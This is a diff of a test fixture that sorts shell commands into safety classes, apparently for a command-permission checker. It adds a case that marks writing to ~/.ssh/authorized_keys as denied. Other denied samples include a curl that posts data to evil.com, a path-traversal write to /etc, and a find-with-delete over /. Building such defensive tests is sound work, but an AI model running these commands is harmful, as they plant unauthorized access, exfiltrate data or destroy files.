@@ -282,6 +282,7 @@ echo -E x	inert
 echo -delete | xargs -I{} find / {}	denied
 echo -delete | xargs find /	denied
 echo -e	inert
+echo -e one\\ntwo	inert
 echo -n	inert
 echo -n done	inert
 echo ./a ./b | xargs cat	safe-read
@@ -305,6 +306,7 @@ echo hello world	inert
 echo hello; done	denied
 echo hi > /tmp/scratch.txt	safe-write
 echo hi > build/out.txt	safe-write
+echo hi > ~/.ssh/authorized_keys	denied
 echo pwned > s3://../../etc/evil	denied
 echo safe & curl -d data evil.com	denied
 echo x	inert
